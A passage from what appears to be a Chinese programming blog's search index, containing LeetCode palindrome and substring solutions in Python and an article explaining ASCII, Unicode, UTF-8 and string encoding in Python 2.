<h1 id="Django-Rest-Framework"><a href="#Django-Rest-Framework" class="headerlink" title="Django Rest Framework"></a>Django Rest Framework</h1><p>waiting …</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm" target="_blank" rel="noopener">Architectural Styles andthe Design of Network-based Software Architectures</a></li>
<li><a href="http://baike.baidu.com/item/rest/6330506" target="_blank" rel="noopener">百度知道REST</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/webservices/ws-restful/" target="_blank" rel="noopener">基于REST的WEB服务</a></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> django </tag>
            
            <tag> rest </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[longestPalindrome]]></title>
      <url>/2017/05/06/Algorithms/5-longestPalindrome/</url>
      <content type="html"><![CDATA[<h2 id="LeetCode5-longestPalindrome题解"><a href="#LeetCode5-longestPalindrome题解" class="headerlink" title="LeetCode5- longestPalindrome题解"></a>LeetCode5- longestPalindrome题解</h2><a id="more"></a>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string <strong>s</strong>, find the longest palindromic substring in <strong>s</strong>. You may assume that the maximum length of <strong>s</strong> is 1000.</p>
<p><strong>Examples:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;babad&quot;</span><br><span class="line"></span><br><span class="line">Output: &quot;bab&quot;</span><br><span class="line"></span><br><span class="line">Note: &quot;aba&quot; is also a valid answer.</span><br></pre></td></tr></table></figure>
<h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>首先判断字符串长度是否为0或1，满足条件直接返回</p>
<p>回文可以分为两类，一类长度是奇数，一类长度是偶数。奇数情况下以任意一个字符<code>s[i]</code>为中心向两边拓展，直到到达边界或遇到<code>s[i-j]!=s[i+j]</code>止。偶数情况下以两个字符<code>s[i],s[i+1]</code>为中心扩展，直到到达边界或遇到<code>s[i-j]!=s[i+j+1]</code>为止</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p>外层循环为O(n)复杂度，内层循环最坏情况下(abababababa这样的字符串)是O(n/2),所以总的时间复杂度是$O(n^2)$,按这个算法跑下来用时398ms</p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome</span><span class="params">(self, s)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :type s: str</span></span><br><span class="line"><span class="string">    :rtype: str</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ans=<span class="string">""</span></span><br><span class="line">    length=len(s)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(length&lt;=<span class="number">1</span> <span class="keyword">or</span> s==s[::<span class="number">-1</span>]):<span class="comment">#如果字符串长度为1直接返回</span></span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length<span class="number">-1</span>): <span class="comment">#最大回文字符串长度为偶数</span></span><br><span class="line">        j=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(i&gt;=j <span class="keyword">and</span> i+j+<span class="number">1</span>&lt;length <span class="keyword">and</span> s[i-j]==s[i+j+<span class="number">1</span>]):</span><br><span class="line">            j=j+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">2</span>*j&gt;len(ans)):</span><br><span class="line">            <span class="comment">#print "here",i,j</span></span><br><span class="line">            ans=s[i-(j<span class="number">-1</span>):i+j+<span class="number">1</span>]</span><br><span class="line">            <span class="comment">#print ans</span></span><br><span class="line"></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length<span class="number">-1</span>): <span class="comment">#最大回文字符串长度位奇数</span></span><br><span class="line">        j=<span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(i&gt;=j <span class="keyword">and</span> i+j&lt;length <span class="keyword">and</span> s[i-j]==s[i+j]):</span><br><span class="line">            j=j+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">2</span>*j<span class="number">-1</span>&gt;=len(ans)):</span><br><span class="line">            <span class="comment">#print "there",i,j</span></span><br><span class="line">            ans=s[i-(j<span class="number">-1</span>):i+(j<span class="number">-1</span>)+<span class="number">1</span>]</span><br><span class="line">            <span class="comment">#print ans</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>
<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>可以证明，在任何一个字符串后面加上一个字符后，最长的回文子串的长度只可能不增加、或者增加1或2 (abab + a情况下长度增加2) (caba+c情况下长度增加1) 。 所以我们只用遍历s的每一个字符，每增加一个字符之后判断最长回文子串的长度是增加1还是2， python  中有一个非常方便的判断字符串是否是回文的方法s==s[::-1]复杂度是$O(n)$</p>
<h3 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度:"></a>时间复杂度:</h3><p>$O(n)$,运行时间只有82ms</p>
<h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Runtime: 82 ms</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestPalindrome2</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        length=len(s)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(length&lt;=<span class="number">1</span> <span class="keyword">or</span> s==s[::<span class="number">-1</span>]):<span class="comment">#如果字符串长度为1直接返回</span></span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        </span><br><span class="line">        start=<span class="number">0</span></span><br><span class="line">        maxLen=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,length):</span><br><span class="line">            <span class="comment">##注意s[1:3]表示的是第2个和第3个char</span></span><br><span class="line">            <span class="keyword">if</span> i-maxLen&gt;=<span class="number">1</span> <span class="keyword">and</span> s[i-maxLen<span class="number">-1</span>:i+<span class="number">1</span>]==s[i-maxLen<span class="number">-1</span>:i+<span class="number">1</span>][::<span class="number">-1</span>]:</span><br><span class="line">                start=i-maxLen<span class="number">-1</span></span><br><span class="line">                maxLen+=<span class="number">2</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i-maxLen&gt;=<span class="number">0</span> <span class="keyword">and</span> s[i-maxLen:i+<span class="number">1</span>]==s[i-maxLen:i+<span class="number">1</span>][::<span class="number">-1</span>]:</span><br><span class="line">                start=i-maxLen</span><br><span class="line">                maxLen+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> s[start:start+maxLen]</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[字符集与编码]]></title>
      <url>/2017/05/04/Python/%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E7%BC%96%E7%A0%81/</url>
      <content type="html"><![CDATA[<h1 id="字符集与编码"><a href="#字符集与编码" class="headerlink" title="字符集与编码"></a>字符集与编码</h1><p>编码问题一直以来都是很多程序员的噩梦，有时候好不容易写好一个带着详细注释的代码文件，保存一下再打开就发现注释全都乱码了。自己工作的时候还好，摸索一下弄对编码就好了。但是如果是多人协作或者发布产品时，没有统一好编码就会造成很大的问题，特别是对于来自不同国家使用不同语言的工作人员/用户来说。因此，统一编码是非常重要的，也就有了Unicode的出现。</p>
<a id="more"></a>
<blockquote>
<p>这里有几个概念需要先弄清楚</p>
<p><strong>Unicode是一个字符集，UTF-8是一种字符编码方案，UTF-8是最常使用的一种Unicode的编码方式</strong></p>
<ol>
<li>Character repertoire 字符集：一个系统所能支持的所有抽象字符，如ASCII标准的字符集，只包含西文字符和符号；或者Unicode标准的字符集</li>
<li>Character encoding scheme 字符编码方案：是指字符集和比特流之间的映射关系，给你一个字符如何把它转换成二进制比特流存储在计算机中，Unicode字符集的编码方式有UTF-8 UTF-16等，而ASCII、GB2312这些标准是一个字符集对应一种编码方案，所以通常我们说ASCII的时候既可以只编码，又可以指字符集</li>
</ol>
</blockquote>
<h2 id="为什么要进行编码？"><a href="#为什么要进行编码？" class="headerlink" title="为什么要进行编码？"></a>为什么要进行编码？</h2><p>对于计算机而言，一切信息都是01比特流，不同01组合表示不同的信息；但是01比特流对人来说就不那么友好了，所以如何用<strong>01比特流来表示自然语言</strong>就是编码产生的原因</p>
<h2 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h2><p>（<strong>American Standard Code for Information Interchange，美国信息互换标准代码</strong>）</p>
<p>我们知道，在计算机内部，所有的信息最终都表示为一个二进制的字符串。每一个二进制位（bit）有0和1两种状态，因此八个二进制位就可以组合出256种状态，这被称为一个字节（byte）。也就是说，一个字节一共可以用来表示256种不同的状态，每一个状态对应一个符号，就是256个符号，从0000000到11111111。</p>
<p>上个世纪60年代，美国制定了一套字符编码，对英语字符与二进制位之间的关系，做了统一规定。这被称为ASCII码，一直沿用至今。</p>
<p>ASCII码一共规定了128个字符的编码，比如空格”SPACE”是32（二进制00100000），大写的字母A是65（二进制01000001）。这128个符号（包括32个不能打印出来的控制符号），只占用了一个字节的后面7位，最前面的1位统一规定为0。</p>
<h2 id="非ASCII码"><a href="#非ASCII码" class="headerlink" title="非ASCII码"></a>非ASCII码</h2><p>英语用128个符号编码就够了，但是用来表示其他语言，128个符号是不够的。比如，在法语中，字母上方有注音符号，它就无法用ASCII码表示。于是，一些欧洲国家就决定，利用字节中闲置的最高位编入新的符号。比如，法语中的é的编码为130（二进制10000010）。这样一来，这些欧洲国家使用的编码体系，可以表示最多256个符号。</p>
<p>但是，这里又出现了新的问题。不同的国家有不同的字母，因此，哪怕它们都使用256个符号的编码方式，代表的字母却不一样。比如，130在法语编码中代表了é，在希伯来语编码中却代表了字母Gimel (ג)，在俄语编码中又会代表另一个符号。但是不管怎样，所有这些编码方式中，0–127表示的符号是一样的，不一样的只是128–255的这一段。</p>
<p>至于亚洲国家的文字，使用的符号就更多了，汉字就多达10万左右。一个字节只能表示256种符号，肯定是不够的，就必须使用多个字节表达一个符号。比如，简体中文常见的编码方式是GB2312，使用两个字节表示一个汉字，所以理论上最多可以表示256x256=65536个符号。</p>
<p>##Unicode</p>
<p>正如上一节所说，世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。</p>
<p>可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是Unicode，就像它的名字都表示的，这是一种所有符号的编码。</p>
<p>Unicode当然是一个很大的集合，现在的规模可以容纳100多万个符号。每个符号的编码都不一样，比如，U+0639表示阿拉伯字母Ain，U+0041表示英语的大写字母A，U+4E25表示汉字”严”。具体的符号对应表，可以查询<a href="http://www.unicode.org/" target="_blank" rel="noopener">unicode.org</a>，或者专门的<a href="http://www.chi2ko.com/tool/CJK.htm" target="_blank" rel="noopener">汉字对应表</a>。</p>
<h3 id="Unicode存在的问题："><a href="#Unicode存在的问题：" class="headerlink" title="Unicode存在的问题："></a>Unicode存在的问题：</h3><p>需要注意的是，Unicode只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。</p>
<p>比如，汉字”严”的unicode是十六进制数4E25，转换成二进制数足足有15位（100111000100101），也就是说这个符号的表示至少需要2个字节。表示其他更大的符号，可能需要3个字节或者4个字节，甚至更多。</p>
<p>这里就有两个严重的问题，第一个问题是，如何才能区别Unicode和ASCII？计算机怎么知道三个字节表示一个符号，而不是分别表示三个符号呢？第二个问题是，我们已经知道，英文字母只用一个字节表示就够了，如果Unicode统一规定，每个符号用三个或四个字节表示，那么每个英文字母前都必然有二到三个字节是0，这对于存储来说是极大的浪费，文本文件的大小会因此大出二三倍，这是无法接受的。</p>
<p>它们造成的结果是：1）出现了Unicode的多种存储方式，也就是说有许多种不同的二进制格式，可以用来表示Unicode。2）Unicode在很长一段时间内无法推广，直到互联网的出现。</p>
<h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>互联网的普及，强烈要求出现一种统一的编码方式。<strong>UTF-8就是在互联网上使用最广的一种Unicode的实现方式</strong></p>
<p>UTF-8最大的一个特点，就是它是<strong>一种变长的编码方式</strong>。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。</p>
<p>UTF-8的编码规则很简单，只有二条：</p>
<p>1）对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英语字母，UTF-8编码和ASCII码是相同的。</p>
<p>2）对于n字节的符号（n&gt;1），第一个字节的前n位都设为1，第n+1位设为0，后面字节的前两位一律设为10。剩下的没有提及的二进制位，全部为这个符号的unicode码。</p>
<p>下表总结了编码规则，字母x表示可用编码的位。</p>
<p>Unicode符号范围 | UTF-8编码方式<br>(十六进制) | （二进制）<br>——————–+———————————————<br>0000 0000-0000 007F | 0xxxxxxx<br>0000 0080-0000 07FF | 110xxxxx 10xxxxxx<br>0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx<br>0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</p>
<p>跟据上表，解读UTF-8编码非常简单。如果一个字节的第一位是0，则这个字节单独就是一个字符；如果第一位是1，则连续有多少个1，就表示当前字符占用多少个字节。</p>
<p>下面，还是以汉字”严”为例，演示如何实现UTF-8编码。</p>
<p>已知”严”的unicode是4E25（100111000100101），根据上表，可以发现4E25处在第三行的范围内（0000 0800-0000 FFFF），因此”严”的UTF-8编码需要三个字节，即格式是”1110xxxx 10xxxxxx 10xxxxxx”。然后，从”严”的最后一个二进制位开始，依次从后向前填入格式中的x，多出的位补0。这样就得到了，”严”的UTF-8编码是”11100100 10111000 10100101”，转换成十六进制就是E4B8A5。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;b=<span class="string">u"严"</span></span><br><span class="line">&gt;&gt;&gt;b</span><br><span class="line"><span class="string">u'\u4e25'</span></span><br><span class="line">&gt;&gt;&gt;a=<span class="string">"严"</span></span><br><span class="line">&gt;&gt;&gt;a</span><br><span class="line"><span class="string">'\xe4\xb8\a5'</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;b.encode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="string">'\xe4\xb8\xa5'</span></span><br><span class="line">&gt;&gt;&gt;b.encode(<span class="string">'ascii'</span>)</span><br><span class="line">UnicodeEncodeError: <span class="string">'ascii'</span> codec can<span class="string">'t encode character u'</span>\u4e25<span class="string">' in position 0: ordinal not in range(128)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt;'</span>\xe4\xb8\xa5<span class="string">'.decode('</span>utf<span class="number">-8</span><span class="string">')</span></span><br><span class="line"><span class="string">u'</span>\u4e25<span class="string">'</span></span><br></pre></td></tr></table></figure>
<h2 id="Python的字符串与编码"><a href="#Python的字符串与编码" class="headerlink" title="Python的字符串与编码"></a>Python的字符串与编码</h2><h3 id="Py文件中的编码"><a href="#Py文件中的编码" class="headerlink" title="Py文件中的编码"></a>Py文件中的编码</h3><p>Python默认脚本文件都是ANSCII编码，当文件中包含中文字符的时候就需要在第一行加上编码声明</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure>
<p>第一行注释是为了告诉Linux/OS X系统，这是一个Python可执行程序，Windows系统会忽略这个注释；</p>
<p>第二行注释是为了告诉Python解释器，按照UTF-8编码读取源代码，否则，你在源代码中写的中文输出可能会有乱码。</p>
<h3 id="Python中的编码与解码"><a href="#Python中的编码与解码" class="headerlink" title="Python中的编码与解码"></a>Python中的编码与解码</h3><p>因为Python的诞生比Unicode标准发布的时间还要早，所以最早的Python只支持ASCII编码，普通的字符串<code>&#39;ABC&#39;</code>在Python内部都是ASCII编码的。Python提供了ord()和chr()函数，可以把字母和对应的数字相互转换：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;ord(<span class="string">'A'</span>)</span><br><span class="line"><span class="number">65</span></span><br><span class="line">&gt;&gt;&gt;chr(<span class="number">65</span>)</span><br><span class="line"><span class="string">'A'</span></span><br></pre></td></tr></table></figure>
<p>Python后来添加了对Unicode的支持，以Unicode表示的字符串用<code>u&#39;...&#39;</code>来表示，比如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">u'中文'</span></span><br><span class="line">中文</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">u'中'</span></span><br><span class="line"><span class="string">u'\u4e2d'</span></span><br></pre></td></tr></table></figure>
<p>写<code>u&#39;中&#39;</code>和<code>u&#39;\u4e2d&#39;</code>是一样的，<code>\u</code>后面是十六进制的Unicode码。因此，<code>u&#39;A&#39;</code>和<code>u&#39;\u0041&#39;</code>也是一样的。</p>
<p>把<code>u&#39;xxx&#39;</code>Unicode转换为UTF-8编码的<code>&#39;xxx&#39;</code>用<code>encode(&#39;utf-8&#39;)</code>方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">u'ABC'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="string">'ABC'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">u'中文'</span>.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="string">'\xe4\xb8\xad\xe6\x96\x87'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python当然也支持其他编码方式，比如把Unicode编码成GB2312, 这种方式纯属自找麻烦，如果没有特殊业务要求，请牢记仅使用Unicode和UTF-8这两种编码方式。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">u'中文'</span>.encode(<span class="string">'gb2312'</span>)</span><br><span class="line"><span class="string">'\xd6\xd0\xce\xc4'</span></span><br></pre></td></tr></table></figure>
<p>反过来，把UTF-8编码表示的字符串<code>&#39;xxx&#39;</code>转换为Unicode字符串<code>u&#39;xxx&#39;</code>用<code>decode(&#39;utf-8&#39;)</code>方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'abc'</span>.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="string">u'abc'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'\xe4\xb8\xad\xe6\x96\x87'</span>.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="string">u'\u4e2d\u6587'</span></span><br><span class="line"><span class="comment">#这里u'\u4e2d\u6587'与u'中文'是一样的</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;<span class="string">'\xd6\xd0\xce\xc4'</span>.decode(<span class="string">'gb2312'</span>)</span><br><span class="line"><span class="string">u'\u4e2d\u6587'</span></span><br></pre></td></tr></table></figure>
<h3 id="非法字符"><a href="#非法字符" class="headerlink" title="非法字符"></a>非法字符</h3><p>对于一些非法字符，如全角空格，转码过程会出现异常。解决办法是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.decode(<span class="string">"gbk"</span>,<span class="string">'ignore'</span>)</span><br></pre></td></tr></table></figure>
<p>因为decode函数原型是 <code>decode([encoding],[errors=&#39;strict&#39;])</code> 可以用第二个参数来控制错误处理的策略，默认的参数是strict，代表遇到非法字符时候抛出异常</p>
<ul>
<li>ignore：会忽略非法字符</li>
<li>replace：会用？取代非法字符</li>
<li>xmlcharreplace：使用XML的字符引用</li>
</ul>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>由于历史遗留问题，Python 2.x版本虽然支持Unicode，但在语法上需要<code>&#39;xxx&#39;</code>和<code>u&#39;xxx&#39;</code>两种字符串表示方式。</p>
<p>在Python 3.x版本中，把<code>&#39;xxx&#39;</code>和<code>u&#39;xxx&#39;</code>统一成Unicode编码，即写不写前缀<code>u</code>都是一样的，而以字节形式表示的字符串则必须加上<code>b</code>前缀：<code>b&#39;xxx&#39;</code>。</p>
<p>格式化字符串的时候，可以用Python的交互式命令行测试，方便快捷。</p>
<p>用代码说就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;a=<span class="string">"中文"</span></span><br><span class="line"><span class="comment"># Python 字符串之前不加u的话 默认使用UTF-8编码方法存储中文</span></span><br><span class="line">&gt;&gt;&gt;a</span><br><span class="line"><span class="string">'\xe4\xb8\xad\xe6\x96\x87'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想让它能正常显示出来，需要按utf-8的方法解码成Unicode</span></span><br><span class="line">&gt;&gt;&gt;a.decode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="string">u'\u4e2d\u6587'</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;a=<span class="string">u"中文"</span> </span><br><span class="line"><span class="comment">#字符串前加u的话 使用Unicode方式存储</span></span><br><span class="line">&gt;&gt;&gt;a</span><br><span class="line"><span class="string">u'\u4e2d\u6587'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果想让它保存成UTF-8的编码形式</span></span><br><span class="line">&gt;&gt;&gt;a.encode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="string">'\xe4\xb8\xad\xe6\x96\x87'</span></span><br></pre></td></tr></table></figure>
<h2 id="Python的编码检测"><a href="#Python的编码检测" class="headerlink" title="Python的编码检测"></a>Python的编码检测</h2><p>使用chardet可以很方便的时间字符串/文本的检测</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> urllib</span><br><span class="line">&gt;&gt;&gt;rawdata = urllib.urlopen(<span class="string">'http://www.google.cn/'</span>).read()</span><br><span class="line">&gt;&gt;&gt;<span class="keyword">import</span> chardet</span><br><span class="line">&gt;&gt;&gt;chardet.detect(rawdata)</span><br><span class="line">&#123;<span class="string">'confidence'</span>: <span class="number">0.98999999999999999</span>, <span class="string">'encoding'</span>: <span class="string">'GB2312'</span>&#125;</span><br><span class="line">&gt;&gt;&gt;a=<span class="string">"中文说的好不好"</span></span><br><span class="line">&gt;&gt;&gt;chardet.detect(a)</span><br><span class="line">&#123;<span class="string">'confidence'</span>: <span class="number">0.98999999999999999</span>, <span class="string">'encoding'</span>: <span class="string">'utf-8'</span>&#125;</span><br><span class="line">&gt;&gt;&gt;chardet.detect(a.decode(<span class="string">"utf-8"</span>).encode(<span class="string">"gbk"</span>))</span><br><span class="line">&#123;<span class="string">'confidence'</span>: <span class="number">0.99</span>, <span class="string">'encoding'</span>: <span class="string">'GB2312'</span>&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考与感谢"><a href="#参考与感谢" class="headerlink" title="参考与感谢"></a>参考与感谢</h2><h3 id="廖雪峰python3教程"><a href="#廖雪峰python3教程" class="headerlink" title="廖雪峰python3教程"></a>廖雪峰python3教程</h3><ul>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431664106267f12e9bef7ee14cf6a8776a479bdec9b9000" target="_blank" rel="noopener">字符串和编码</a></li>
</ul>
<h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><ul>
<li><a href="http://2wildkids.com/2016/10/12/%E5%AD%97%E7%AC%A6%E9%9B%86%E4%B8%8E%E7%BC%96%E7%A0%81%E7%9A%84%E6%81%A9%E6%80%A8%E6%83%85%E4%BB%87/" target="_blank" rel="noopener">字符集与编码的恩怨情仇</a></li>
<li><a href="http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html" target="_blank" rel="noopener">字符编码笔记：ASCII，Unicode和UTF-8 </a></li>
<li><a href="http://gitbook.cn/books/599d075614d1bc13375caeaf/index.html" target="_blank" rel="noopener">字符编码的前世今生</a></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> Unicode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[lengthOfLongestSubstring]]></title>
      <url>/2017/04/26/Algorithms/3-lengthOfLongestSubstring/</url>
      <content type="html"><![CDATA[<h2 id="LeetCode3-lengthOfLongestSubstring题解"><a href="#LeetCode3-lengthOfLongestSubstring题解" class="headerlink" title="LeetCode3- lengthOfLongestSubstring题解"></a>LeetCode3- lengthOfLongestSubstring题解</h2><a id="more"></a>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string, find the length of the <strong>longest substring</strong> without repeating characters.</p>
<p><strong>Examples:</strong></p>
<p>Given <code>&quot;abcabcbb&quot;</code>, the answer is <code>&quot;abc&quot;</code>, which the length is 3.</p>
<p>Given <code>&quot;bbbbb&quot;</code>, the answer is <code>&quot;b&quot;</code>, with the length of 1.</p>
<p>Given <code>&quot;pwwkew&quot;</code>, the answer is <code>&quot;wke&quot;</code>, with the length of 3. Note that the answer must be a <strong>substring</strong>, <code>&quot;pwke&quot;</code> is a <em>subsequence</em> and not a substring.</p>
<h2 id="思路一："><a href="#思路一：" class="headerlink" title="思路一："></a>思路一：</h2><p>外层循环，遍历每个字符，计算以该字符为首的最长的substring</p>
<p>（可以定义个<code>boolean allUnique(String substring)</code>来判断这个substring中的所有char是否相互不同）</p>
<h3 id="时间复杂度："><a href="#时间复杂度：" class="headerlink" title="时间复杂度："></a>时间复杂度：</h3><p>对于每一个i，判断[i,j)中的字符串是否为substring，判断函数需要花费$O(j-i)$时间</p>
<p>所以总的时间复杂度是</p>
